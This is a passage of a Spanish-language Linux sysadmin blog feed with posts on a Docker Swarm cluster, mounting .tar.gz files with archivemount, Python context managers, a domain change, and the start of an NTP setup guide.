&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~$ docker info
...
Swarm: active
 NodeID: rtmzvsbndn4ox5mhzsgu2xi81
 Is Manager: &lt;span class="nb"&gt;true&lt;/span&gt;
 ClusterID: krknl2v0llpyczyqg1ihi250d
 Managers: &lt;span class="m"&gt;1&lt;/span&gt;
 Nodes: &lt;span class="m"&gt;3&lt;/span&gt;
 Orchestration:
  Task History Retention Limit: &lt;span class="m"&gt;5&lt;/span&gt;
 Raft:
  Snapshot Interval: &lt;span class="m"&gt;10000&lt;/span&gt;
  Number of Old Snapshots to Retain: &lt;span class="m"&gt;0&lt;/span&gt;
  Heartbeat Tick: &lt;span class="m"&gt;1&lt;/span&gt;
  Election Tick: &lt;span class="m"&gt;3&lt;/span&gt;
 Dispatcher:
  Heartbeat Period: &lt;span class="m"&gt;5&lt;/span&gt; seconds
 CA Configuration:
  Expiry Duration: &lt;span class="m"&gt;3&lt;/span&gt; months
  Force Rotate: &lt;span class="m"&gt;0&lt;/span&gt;
 Root Rotation In Progress: &lt;span class="nb"&gt;false&lt;/span&gt;
 Node Address: &lt;span class="m"&gt;192&lt;/span&gt;.168.56.2
 Manager Addresses:
  &lt;span class="m"&gt;192&lt;/span&gt;.168.56.2:2377
...
gerard@shangrila:~$ docker node ls
ID                            HOSTNAME            STATUS              AVAILABILITY        MANAGER STATUS
5p0wbl6rhvs5oo461xsmxhph4     eldorado            Ready               Active
rtmzvsbndn4ox5mhzsgu2xi81 *   shangrila           Ready               Active              Leader
su20j7s0itgssfcm8x5whz8o8     arcadia             Ready               Active
gerard@shangrila:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;AVISO:&lt;/strong&gt; Tened en cuenta que los comandos de estado del cluster solo se pueden lanzar en un &lt;em&gt;manager&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Y con esto tenemos montado nuestro cluster.&lt;/p&gt;</content><category term="docker"></category><category term="swarm"></category><category term="cluster"></category></entry><entry><title>Usar un sistema de ficheros de lectura y escritura en un fichero .tar.gz</title><link href="http://www.linuxsysadmin.ml/2017/10/usar-un-sistema-de-ficheros-de-lectura-y-escritura-en-un-fichero-targz.md.html" rel="alternate"></link><published>2017-10-23T10:00:00+02:00</published><updated>2017-10-23T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-10-23:/2017/10/usar-un-sistema-de-ficheros-de-lectura-y-escritura-en-un-fichero-targz.md.html</id><summary type="html">&lt;p&gt;¿Alguna vez habéis querido mirar en fichero &lt;em&gt;.tar.gz&lt;/em&gt;, pero sin tener que descomprimirlo? Tal vez te gustaría extraer solo unos pocos ficheros; puede que lo que te interese es trabajar con una carpeta a la que le modificamos los archivos, sin tener que archivar esta carpeta cada cierto tiempo …&lt;/p&gt;</summary><content type="html">&lt;p&gt;¿Alguna vez habéis querido mirar en fichero &lt;em&gt;.tar.gz&lt;/em&gt;, pero sin tener que descomprimirlo? Tal vez te gustaría extraer solo unos pocos ficheros; puede que lo que te interese es trabajar con una carpeta a la que le modificamos los archivos, sin tener que archivar esta carpeta cada cierto tiempo.&lt;/p&gt;
&lt;p&gt;En este caso, tenemos un sistema de ficheros bastante interesante que se llama &lt;strong&gt;archivemount&lt;/strong&gt;, y que nos permite ver un fichero &lt;em&gt;.tar.gz&lt;/em&gt; como si de una carpeta local más se tratara. Al desmontar este sistema de fichero, se crea el mismo fichero de nuevo, de forma automática, y con previa copia del anterior.&lt;/p&gt;
&lt;p&gt;Según la &lt;a href="https://en.wikipedia.org/wiki/Archivemount"&gt;wikipedia&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;archivemount is a FUSE-based file system for Unix variants, including Linux. Its purpose is to mount archives (i.e. tar, tar.gz, etc.) to a mount point where it can be read from or written to as with any other file system. This makes accessing the contents of the archive, which may be compressed, transparent to other programs, without decompressing them.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Para demostrar como funciona, necesitaremos una máquina normal. Como pienso desecharla tal como haya escrito estas palabras, voy a usar un contenedor &lt;strong&gt;docker&lt;/strong&gt; con una &lt;strong&gt;Debian Jessie&lt;/strong&gt;; la distribución no debería ser importante.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: No se puede usar el comando &lt;strong&gt;archivemount&lt;/strong&gt; en un contenedor &lt;strong&gt;docker&lt;/strong&gt;, a menos que se levante con la opción &lt;em&gt;--privileged&lt;/em&gt;, que es lo que yo he usado.&lt;/p&gt;
&lt;p&gt;Vamos a empezar instalando el paquete &lt;strong&gt;archivemount&lt;/strong&gt;, que nos va a dar las herramientas para montar nuestros ficheros comprimidos. Cada distribución lo hace a su manera; revisa la documentación de la tuya.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@cfed45d103a2:~# apt-get install archivemount
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following extra packages will be installed:
  fuse libalgorithm-c3-perl libarchive-extract-perl libarchive13 libcgi-fast-perl libcgi-pm-perl libclass-c3-perl libclass-c3-xs-perl libcpan-meta-perl libdata-optlist-perl
  libdata-section-perl libfcgi-perl libfuse2 libgdbm3 liblog-message-perl liblog-message-simple-perl liblzo2-2 libmodule-build-perl libmodule-pluggable-perl libmodule-signature-perl
  libmro-compat-perl libnettle4 libpackage-constants-perl libparams-util-perl libpod-latex-perl libpod-readme-perl libregexp-common-perl libsoftware-license-perl libsub-exporter-perl
  libsub-install-perl libterm-ui-perl libtext-soundex-perl libtext-template-perl libxml2 perl perl-modules rename sgml-base xml-core
Suggested packages:
  lrzip perl-doc libterm-readline-gnu-perl libterm-readline-perl-perl make libb-lint-perl libcpanplus-dist-build-perl libcpanplus-perl libfile-checktree-perl libobject-accessor-perl
  sgml-base-doc debhelper
Recommended packages:
  libarchive-tar-perl
The following NEW packages will be installed:
  archivemount fuse libalgorithm-c3-perl libarchive-extract-perl libarchive13 libcgi-fast-perl libcgi-pm-perl libclass-c3-perl libclass-c3-xs-perl libcpan-meta-perl libdata-optlist-perl
  libdata-section-perl libfcgi-perl libfuse2 libgdbm3 liblog-message-perl liblog-message-simple-perl liblzo2-2 libmodule-build-perl libmodule-pluggable-perl libmodule-signature-perl
  libmro-compat-perl libnettle4 libpackage-constants-perl libparams-util-perl libpod-latex-perl libpod-readme-perl libregexp-common-perl libsoftware-license-perl libsub-exporter-perl
  libsub-install-perl libterm-ui-perl libtext-soundex-perl libtext-template-perl libxml2 perl perl-modules rename sgml-base xml-core
&lt;span class="m"&gt;0&lt;/span&gt; upgraded, &lt;span class="m"&gt;40&lt;/span&gt; newly installed, &lt;span class="m"&gt;0&lt;/span&gt; to remove and &lt;span class="m"&gt;0&lt;/span&gt; not upgraded.
Need to get &lt;span class="m"&gt;8172&lt;/span&gt; kB of archives.
After this operation, &lt;span class="m"&gt;41&lt;/span&gt;.7 MB of additional disk space will be used.
Do you want to &lt;span class="k"&gt;continue&lt;/span&gt;? &lt;span class="o"&gt;[&lt;/span&gt;Y/n&lt;span class="o"&gt;]&lt;/span&gt; y
...
root@cfed45d103a2:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para montar un fichero comprimido en una carpeta, necesitamos ambos, así que los creamos. El fichero comprimido va a ser un fichero &lt;em&gt;.tar.gz&lt;/em&gt; vacío.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@cfed45d103a2:~# mkdir data
root@cfed45d103a2:~# tar czvf data.tar.gz --files-from /dev/null
root@cfed45d103a2:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vemos como nos queda la carpeta local, con ambas cosas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@cfed45d103a2:~# tree
.
&lt;span class="p"&gt;|&lt;/span&gt;-- data
&lt;span class="sb"&gt;`&lt;/span&gt;-- data.tar.gz

&lt;span class="m"&gt;1&lt;/span&gt; directory, &lt;span class="m"&gt;1&lt;/span&gt; file
root@cfed45d103a2:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo queda montar el sistema de ficheros para empezar a utilizarlo. Aunque se podría delegar el montaje del sistema de ficheros al sistema escribiendo en &lt;em&gt;/etc/fstab&lt;/em&gt;, vamos a hacerlo manualmente en este ejemplo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@cfed45d103a2:~# archivemount data.tar.gz data/
root@cfed45d103a2:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a crear algunos ficheros en la carpeta. Es especialmente interesante fijarnos en que trabajamos con una carpeta normal, como lo haríamos habitualmente. De esta forma, hasta un &lt;em&gt;software&lt;/em&gt; existente podría modificar este sistema de ficheros.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@cfed45d103a2:~# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;no content&amp;quot;&lt;/span&gt; &amp;gt; data/README
root@cfed45d103a2:~# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt; &amp;gt; data/VERSION
root@cfed45d103a2:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Comprobamos lo que tenemos, solo para asegurar el éxito:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@cfed45d103a2:~# tree
.
&lt;span class="p"&gt;|&lt;/span&gt;-- data
&lt;span class="p"&gt;|&lt;/span&gt;   &lt;span class="p"&gt;|&lt;/span&gt;-- README
&lt;span class="p"&gt;|&lt;/span&gt;   &lt;span class="sb"&gt;`&lt;/span&gt;-- VERSION
&lt;span class="sb"&gt;`&lt;/span&gt;-- data.tar.gz

&lt;span class="m"&gt;1&lt;/span&gt; directory, &lt;span class="m"&gt;3&lt;/span&gt; files
root@cfed45d103a2:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Cuando acabemos de trabajar con el sistema de ficheros y se desmonte, pasará la magia; se va a comprimir el sistema de ficheros en el fichero &lt;em&gt;.tar.gz&lt;/em&gt; con el nombre inicial, previa copia del antiguo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@cfed45d103a2:~# umount data
root@cfed45d103a2:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver que el sistema de ficheros ya no está disponible, como esperaríamos de un &lt;em&gt;umount&lt;/em&gt;; el fichero que montamos en su momento ha quedado como &lt;em&gt;data.tar.gz.orig&lt;/em&gt;, y el fichero &lt;em&gt;data.tar.gz&lt;/em&gt; tiene el contenido actualizado de nuestra sesión de trabajo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@cfed45d103a2:~# tree
.
&lt;span class="p"&gt;|&lt;/span&gt;-- data
&lt;span class="p"&gt;|&lt;/span&gt;-- data.tar.gz
&lt;span class="sb"&gt;`&lt;/span&gt;-- data.tar.gz.orig

&lt;span class="m"&gt;1&lt;/span&gt; directory, &lt;span class="m"&gt;2&lt;/span&gt; files
root@cfed45d103a2:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos comprobar el contenido simplemente verificando lo que hay en los ficheros:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@cfed45d103a2:~# tar tzf data.tar.gz
tar: Removing leading &lt;span class="sb"&gt;`&lt;/span&gt;/&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; from member names
/README
/VERSION
root@cfed45d103a2:~# tar tzf data.tar.gz.orig 
root@cfed45d103a2:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y como podíamos esperar, el fichero &lt;em&gt;data.gz.orig&lt;/em&gt; está vacío y el fichero &lt;em&gt;data.tar.gz&lt;/em&gt; contiene los nuevos ficheros. Es importante recalcar que si se volviera a montar y desmontar el sistema de ficheros -y hubieran cambios en el mismo-, se volvería a crear el fichero &lt;em&gt;data.tar.gz&lt;/em&gt;, y el &lt;em&gt;data.tar.gz.orig&lt;/em&gt; quedaría sobrescrito de nuevo.&lt;/p&gt;</content><category term="linux"></category><category term="archivemount"></category><category term="mount"></category><category term="tar"></category><category term="gz"></category><category term="targz"></category></entry><entry><title>Los context managers de python</title><link href="http://www.linuxsysadmin.ml/2017/10/los-context-managers-de-python.html" rel="alternate"></link><published>2017-10-16T10:00:00+02:00</published><updated>2017-10-16T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-10-16:/2017/10/los-context-managers-de-python.html</id><summary type="html">&lt;p&gt;Muchas veces nos pasa que necesitamos un objeto de esos que luego necesitan algún tipo de limpieza cuando ya no se necesitan. Cualquier programador avanzado os puede contar lo fácil que es olvidarse de la destrucción del mismo, y de las veces que lo ha hecho, él u otras personas …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Muchas veces nos pasa que necesitamos un objeto de esos que luego necesitan algún tipo de limpieza cuando ya no se necesitan. Cualquier programador avanzado os puede contar lo fácil que es olvidarse de la destrucción del mismo, y de las veces que lo ha hecho, él u otras personas.&lt;/p&gt;
&lt;p&gt;Por suerte, &lt;strong&gt;python&lt;/strong&gt; nos ofrece una forma de crear objetos con el &lt;em&gt;keyword with&lt;/em&gt;, que nos asegura que el mismo lenguaje de programación llamará a los métodos de creación y destrucción del objeto. Este mecanismo se llama &lt;em&gt;context manager&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Veamos un ejemplo simple de un &lt;em&gt;context manager&lt;/em&gt; muy común y disponible en la biblioteca estándar de &lt;strong&gt;python&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/contextmanagers$ cat example.py 
&lt;span class="c1"&gt;#!/usr/bin/env python&lt;/span&gt;

with open&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;greeting.txt&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; as f:
    print f.read&lt;span class="o"&gt;()&lt;/span&gt;
gerard@sirius:~/contextmanagers$ cat greeting.txt 
Hello world
gerard@sirius:~/contextmanagers$ ./example.py 
Hello world

gerard@sirius:~/contextmanagers$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La idea es que la función &lt;code&gt;open()&lt;/code&gt; va a inicializar y devolver un &lt;em&gt;file descriptor&lt;/em&gt; que vamos a recoger como &lt;code&gt;f&lt;/code&gt; gracias al &lt;em&gt;keyword&lt;/em&gt; &lt;code&gt;as&lt;/code&gt;. Cuando salgamos del bloque &lt;code&gt;with&lt;/code&gt;, se va a llamar a una función que se va a encargar de cerrar el fichero a nivel de sistema operativo.&lt;/p&gt;
&lt;h2&gt;Creando un context manager&lt;/h2&gt;
&lt;p&gt;Un &lt;em&gt;context manager&lt;/em&gt; no es otra cosa que un objeto que tiene dos métodos: &lt;code&gt;__enter__()&lt;/code&gt; y &lt;code&gt;__exit__()&lt;/code&gt;. El método &lt;code&gt;__enter__()&lt;/code&gt; es el que inicializa el objeto a devolver (el que recogemos con el &lt;em&gt;keyword&lt;/em&gt; &lt;code&gt;as&lt;/code&gt;) y lo devuelve, aunque es opcional devolver algo. El método &lt;code&gt;__exit__()&lt;/code&gt; es el que se llama automáticamente cuando acaba el bloque &lt;code&gt;with&lt;/code&gt;, y se encargaría de destruir el objeto devuelto.&lt;/p&gt;
&lt;p&gt;Veamos un ejemplo para generar el marcado HTML de una forma programática:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/contextmanagers$ cat html_v1.py 
&lt;span class="c1"&gt;#!/usr/bin/env python&lt;/span&gt;

class Tag&lt;span class="o"&gt;(&lt;/span&gt;object&lt;span class="o"&gt;)&lt;/span&gt;:

    def __init__&lt;span class="o"&gt;(&lt;/span&gt;self, tag&lt;span class="o"&gt;)&lt;/span&gt;:
        self.tag &lt;span class="o"&gt;=&lt;/span&gt; tag

    def __enter__&lt;span class="o"&gt;(&lt;/span&gt;self&lt;span class="o"&gt;)&lt;/span&gt;:
        print &lt;span class="s1"&gt;&amp;#39;&amp;lt;%s&amp;gt;&amp;#39;&lt;/span&gt; % self.tag

    def __exit__&lt;span class="o"&gt;(&lt;/span&gt;self, *args&lt;span class="o"&gt;)&lt;/span&gt;:
        print &lt;span class="s1"&gt;&amp;#39;&amp;lt;/%s&amp;gt;&amp;#39;&lt;/span&gt; % self.tag

with Tag&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;div&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
    with Tag&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;p&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
        print &lt;span class="s1"&gt;&amp;#39;Lorem ipsum&amp;#39;&lt;/span&gt;
    with Tag&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;p&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
        print &lt;span class="s1"&gt;&amp;#39;et dolor sit amet&amp;#39;&lt;/span&gt;
gerard@sirius:~/contextmanagers$ ./html_v1.py 
&amp;lt;div&amp;gt;
&amp;lt;p&amp;gt;
Lorem ipsum
&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;
et dolor sit amet
&amp;lt;/p&amp;gt;
&amp;lt;/div&amp;gt;
gerard@sirius:~/contextmanagers$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Este ejemplo no es muy útil, pero queda claro como y cuando se llaman los creadores y destructores. Es interesante que no devolvemos ninguna variable en el método &lt;code&gt;__enter__()&lt;/code&gt;, y que por lo tanto, la cláusula &lt;code&gt;with&lt;/code&gt; no recoge nada con un &lt;code&gt;as&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Una versión todavía más simple&lt;/h2&gt;
&lt;p&gt;Crear el objeto que va a actuar como &lt;em&gt;context manager&lt;/em&gt; es interesante, pero también un montón de líneas en nuestro código. Si queremos simplificar nuestro &lt;em&gt;context manager&lt;/em&gt;, podemos encontrar la solución en la biblioteca estándar de &lt;strong&gt;python&lt;/strong&gt;, en el módulo &lt;em&gt;contextlib&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;De esta forma, el ejemplo anterior queda reducido a uno similar, que es el que sigue:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/contextmanagers$ cat html_v2.py 
&lt;span class="c1"&gt;#!/usr/bin/env python&lt;/span&gt;

from contextlib import contextmanager

@contextmanager
def tag&lt;span class="o"&gt;(&lt;/span&gt;tag&lt;span class="o"&gt;)&lt;/span&gt;:
    print &lt;span class="s1"&gt;&amp;#39;&amp;lt;%s&amp;gt;&amp;#39;&lt;/span&gt; % tag
    yield
    print &lt;span class="s1"&gt;&amp;#39;&amp;lt;/%s&amp;gt;&amp;#39;&lt;/span&gt; % tag

with tag&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;div&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
    with tag&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;p&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
        print &lt;span class="s1"&gt;&amp;#39;Lorem ipsum&amp;#39;&lt;/span&gt;
    with tag&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;p&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
        print &lt;span class="s1"&gt;&amp;#39;et dolor sit amet&amp;#39;&lt;/span&gt;
gerard@sirius:~/contextmanagers$ ./html_v2.py 
&amp;lt;div&amp;gt;
&amp;lt;p&amp;gt;
Lorem ipsum
&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;
et dolor sit amet
&amp;lt;/p&amp;gt;
&amp;lt;/div&amp;gt;
gerard@sirius:~/contextmanagers$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E·n este caso es todavía más simple de entender: tenemos la inicialización, devolvemos la variable o nada con el &lt;em&gt;keyword&lt;/em&gt; &lt;code&gt;yield&lt;/code&gt; y finalmente tenemos el código de finalización.&lt;/p&gt;</content><category term="python"></category><category term="context manager"></category></entry><entry><title>Esta semana no hay artículo</title><link href="http://www.linuxsysadmin.ml/2017/10/esta-semana-no-hay-articulo.html" rel="alternate"></link><published>2017-10-09T16:30:00+02:00</published><updated>2017-10-09T16:30:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-10-09:/2017/10/esta-semana-no-hay-articulo.html</id><summary type="html">&lt;p&gt;Como algunos habreis podido comprobar, me he visto obligado a cambiar el dominio, de &lt;a href="http://www.linuxsysadmin.ml"&gt;www.linuxsysadmin.tk&lt;/a&gt; a &lt;a href="http://www.linuxsysadmin.ml"&gt;www.linuxsysadmin.ml&lt;/a&gt;. Este cambio viene motivado por la interrupción del dominio, que pude disfrutar de forma gratuita hasta la fecha de caducidad. Ahora me veo obligado a un cambio muy forzado …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Como algunos habreis podido comprobar, me he visto obligado a cambiar el dominio, de &lt;a href="http://www.linuxsysadmin.ml"&gt;www.linuxsysadmin.tk&lt;/a&gt; a &lt;a href="http://www.linuxsysadmin.ml"&gt;www.linuxsysadmin.ml&lt;/a&gt;. Este cambio viene motivado por la interrupción del dominio, que pude disfrutar de forma gratuita hasta la fecha de caducidad. Ahora me veo obligado a un cambio muy forzado.&lt;/p&gt;
&lt;p&gt;El principio de este &lt;em&gt;blog&lt;/em&gt; era el de publicar artículos que sirvan como tutoriales a todo el que los pudiera necesitar, y para ello se ideó una solución sin coste basándose en un generador de contenido estático, alojamiento en github y un dominio gratuito.&lt;/p&gt;
&lt;p&gt;Este dominio gratuito ha expirado y ahora cuesta dinero, concretamente más de la miseria que entra en concepto publicidad. Así pues, la única opción viable ha sido usar otro dominio, por supuesto, gratuito tambien.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Un haiku sobre problemas de DNS" src="http://www.linuxsysadmin.ml/images/haiku_dns.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Aunque era un riesgo que ya conocía, esto supone básicamente la pérdida de dos cosas, ambas importantes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;El estado de indexación y búsqueda en google&lt;/li&gt;
&lt;li&gt;Aquellos lectores fieles que me seguían habitualmente&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Estas actuaciones han provocado que no hay artículo durante la semana, y tener que esperar a la semana que viene. Así que os pido perdón por las molestias ocasionadas y espero que sigáis siendo fieles lectores. Por mi parte, espero no volver a dejar caducar el nuevo dominio.&lt;/p&gt;</content></entry><entry><title>Un servicio casi imprescindible: NTP</title><link href="http://www.linuxsysadmin.ml/2017/10/un-servicio-casi-imprescindible-ntp.html" rel="alternate"></link><published>2017-10-02T10:00:00+02:00</published><updated>2017-10-02T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-10-02:/2017/10/un-servicio-casi-imprescindible-ntp.html</id><summary type="html">&lt;p&gt;Normalmente, me gustan los servidores con un número de servicios tirando a mezquino; menos servicios significan menos actualizaciones, menos superficie de ataque y menos recursos ocupados. Sin embargo, hay algunos que son imprescindibles, mientras que otros son altamente recomendables. Este es el caso del &lt;strong&gt;NTP&lt;/strong&gt;, que mantiene la hora actualizada …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Normalmente, me gustan los servidores con un número de servicios tirando a mezquino; menos servicios significan menos actualizaciones, menos superficie de ataque y menos recursos ocupados. Sin embargo, hay algunos que son imprescindibles, mientras que otros son altamente recomendables. Este es el caso del &lt;strong&gt;NTP&lt;/strong&gt;, que mantiene la hora actualizada.&lt;/p&gt;
&lt;p&gt;Esto es crucial para muchos servicios de &lt;em&gt;cluster&lt;/em&gt;, que necesitan una sincronización temporal estricta. Otros usos son para aplicaciones y sus &lt;em&gt;logs&lt;/em&gt;, en donde el momento exacto en el que pasan las cosas es crucial, y puede ser consultado en &lt;em&gt;logs&lt;/em&gt; de varias máquinas, que idealmente deberían coincidir. Finalmente, el otro uso que considero indispensable es para aquellas máquinas que se dedican a virtualizar contenedores u otras máquinas virtuales, ya que pagando el precio del proceso una única vez, permite a sus descendientes (por ejemplo, contenedores &lt;strong&gt;docker&lt;/strong&gt;) seguir actualizadas.&lt;/p&gt;
&lt;h2&gt;Instalación de NTP&lt;/h2&gt;
&lt;p&gt;El servicio &lt;strong&gt;NTP&lt;/strong&gt; se instala en un solo paquete, que tanto en la famíla &lt;em&gt;RedHat&lt;/em&gt; con en la família &lt;em&gt;Debian&lt;/em&gt;, se llama &lt;strong&gt;ntp&lt;/strong&gt;. Usad las herramientas que tengáis a mano en vuestra distribución.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# apt-get install ntp
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias
Leyendo la información de estado... Hecho
Se instalarán los siguientes paquetes adicionales:
  libopts25 libperl5.24 perl perl-modules-5.24 rename
Paquetes sugeridos:
  ntp-doc perl-doc libterm-readline-gnu-perl &lt;span class="p"&gt;|&lt;/span&gt; libterm-readline-perl-perl make
Se instalarán los siguientes paquetes NUEVOS:
  libopts25 libperl5.24 ntp perl perl-modules-5.24 rename
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;6&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;7&lt;/span&gt;.103 kB de archivos.
Se utilizarán &lt;span class="m"&gt;42&lt;/span&gt;,1 MB de espacio de disco adicional después de esta operación.
¿Desea continuar? &lt;span class="o"&gt;[&lt;/span&gt;S/n&lt;span class="o"&gt;]&lt;/span&gt; s
...
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La configuración por defecto ya viene preconfigurada con algunos servidores base contra los que sincronizar. Podemos ver que estamos sincronizando y contra qué, con el comando &lt;strong&gt;ntpq&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# ntpq -p
     remote           refid      st t when poll reach   delay   offset  &lt;span class="nv"&gt;jitter&lt;/span&gt;
&lt;span class="o"&gt;==============================================================================&lt;/span&gt;
 &lt;span class="m"&gt;0&lt;/span&gt;.debian.pool.n .POOL.          &lt;span class="m"&gt;16&lt;/span&gt; p    -   &lt;span class="m"&gt;64&lt;/span&gt;    &lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="m"&gt;0&lt;/span&gt;.000    &lt;span class="m"&gt;0&lt;/span&gt;.000   &lt;span class="m"&gt;0&lt;/span&gt;.000
 &lt;span class="m"&gt;1&lt;/span&gt;.debian.pool.n .POOL.          &lt;span class="m"&gt;16&lt;/span&gt; p    -   &lt;span class="m"&gt;64&lt;/span&gt;    &lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="m"&gt;0&lt;/span&gt;.000    &lt;span class="m"&gt;0&lt;/span&gt;.000   &lt;span class="m"&gt;0&lt;/span&gt;.000
 &lt;span class="m"&gt;2&lt;/span&gt;.debian.pool.n .POOL.          &lt;span class="m"&gt;16&lt;/span&gt; p    -   &lt;span class="m"&gt;64&lt;/span&gt;    &lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="m"&gt;0&lt;/span&gt;.000    &lt;span class="m"&gt;0&lt;/span&gt;.000   &lt;span class="m"&gt;0&lt;/span&gt;.000
 &lt;span class="m"&gt;3&lt;/span&gt;.debian.pool.n .POOL.          &lt;span class="m"&gt;16&lt;/span&gt; p    -   &lt;span class="m"&gt;64&lt;/span&gt;    &lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="m"&gt;0&lt;/span&gt;.000    &lt;span class="m"&gt;0&lt;/span&gt;.000   &lt;span class="m"&gt;0&lt;/span&gt;.000
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso, podemos ver que, debido a la configuración de red, no llegamos a los servidores:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;El tiempo desde la última sincronización no existe (&lt;em&gt;when&lt;/em&gt; vacío)&lt;/li&gt;
&lt;li&gt;El &lt;em&gt;stratum&lt;/em&gt; de los servidores es infinito, con lo que son inaccesibles (&lt;em&gt;st&lt;/em&gt; vale 16 para marcar esta inaccesibilidad)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Así pues, vamos a cambiar la configuración del &lt;strong&gt;NTP&lt;/strong&gt; para acceder a un servidor &lt;strong&gt;NTP&lt;/strong&gt; en nuestra propia red local, y quitando los que habían.&lt;/p&gt;
